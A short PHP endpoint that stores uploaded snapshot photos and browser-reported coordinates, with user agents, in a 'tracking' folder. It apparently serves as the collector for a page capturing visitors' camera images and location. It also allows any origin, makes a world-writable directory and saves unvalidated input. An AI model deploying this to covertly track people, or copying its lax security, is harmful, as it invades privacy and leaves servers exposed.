<?php
// Set headers for CORS if needed, though usually same-origin in this deployment
header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // Define storage path outside of public if possible, but for this demo we'll use a local folder
    $storageFolder = '../storage/tracking'; 
    if (!is_dir($storageFolder)) {
        mkdir($storageFolder, 0777, true);
    }

    $timestamp = time();
    $status = [];

    // ================= SNAPSHOT CAPTURE =================
    if (isset($_FILES['foto'])) {
        $foto = $_FILES['foto']['tmp_name'];
        $fileFoto = $storageFolder . '/snap_' . $timestamp . '.png';
        if (move_uploaded_file($foto, $fileFoto)) {
            $status[] = "Photo saved";
        } else {
            $status[] = "Photo upload failed";
        }
    }

    // ================= GEOLOCATION CAPTURE =================
    $lat = $_POST['lat'] ?? null;
    $lng = $_POST['lng'] ?? null;
    $accuracy = $_POST['accuracy'] ?? null;

    if ($lat !== null && $lng !== null) {
        $locFile = $storageFolder . '/log_' . $timestamp . '.txt';
        $locData = "Timestamp: " . date("Y-m-d H:i:s", $timestamp) . "\n";
        $locData .= "Latitude: $lat\n";
        $locData .= "Longitude: $lng\n";
        $locData .= "Accuracy: $accuracy meters\n";
        $locData .= "User Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
        
        if (file_put_contents($locFile, $locData)) {
            $status[] = "Location logged";
        } else {
            $status[] = "Location logging failed";
        }
    }

    if (empty($status)) {
        http_response_code(400);
        echo json_encode(["status" => "error", "message" => "No data received"]);
    } else {
        echo json_encode(["status" => "success", "details" => $status]);
    }

} else {
    http_response_code(405);
    echo json_encode(["status" => "error", "message" => "Method not allowed"]);
}
?>
